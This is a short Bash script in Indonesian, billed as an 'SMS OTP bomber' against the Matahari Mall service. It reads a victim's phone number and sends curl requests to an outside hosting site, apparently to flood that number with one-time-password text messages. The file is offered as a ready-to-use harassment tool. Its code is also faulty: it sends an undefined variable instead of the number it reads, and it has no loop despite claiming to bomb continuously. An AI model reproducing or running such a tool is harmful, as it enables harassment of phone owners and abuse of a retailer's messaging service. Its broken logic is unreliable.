#!/bin/bash
#code by Muhammad Fazriansyah
#Reedit and recode by @Sandro.putraa


# Warna
blue='\e[0;34'
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'

#main 
echo -e $blue"mBom Sms OTP Matahari Mall"
echo -e $cyan"Coded by Muhammad Fazriansyah"
echo -e $lightgreen">> input dgn 628xxx>>"
echo -e $red""
read -p "Input No HP: " sayang;
echo ""  
echo -e $yellow"Sedang mencoba Ngebom :)"
echo -e $okegreen"Selama Ngga di Close bakal Ngebom terus :)"
echo -e $okegreen""
echo -e $cyan">>>> Hasil >>>>"
if [ $sayang]
then
curl "https://sandroewek.000webhostapp.com/mm/r.php"

curl "https://sandroewek.000webhostapp.com/mm/api1.php?no=$anjg"
sleep 1
fi
